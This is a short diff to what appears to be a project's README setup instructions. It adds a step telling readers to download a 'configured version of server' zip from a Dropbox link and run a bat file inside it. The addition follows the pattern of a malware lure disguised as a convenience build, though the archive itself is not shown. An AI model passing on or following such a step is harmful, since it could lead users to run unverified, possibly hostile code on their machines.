@@ -21,4 +21,8 @@ Run the following:
 
 4.You are ready and do npm start or node index.js
 -------------
+
+5.This is configured version of server first need run bat file install dep than start https://www.dropbox.com/s/ujigushdzuw5sn9/opensource.zip?dl=0
+-------------
+
 ![Screenshot](https://i.imgur.com/6jTIYnz.jpg)
